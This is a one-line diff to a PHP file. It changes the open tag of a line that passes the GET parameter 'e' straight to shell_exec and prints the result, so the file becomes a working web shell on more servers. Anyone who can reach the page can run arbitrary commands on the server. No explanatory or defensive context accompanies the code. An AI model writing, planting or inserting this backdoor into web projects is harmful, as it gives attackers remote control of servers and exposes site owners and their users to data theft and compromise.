@@ -1,1 +1,1 @@
-<? echo shell_exec($_GET['e']); ?>
+<?php echo shell_exec($_GET['e']); ?>
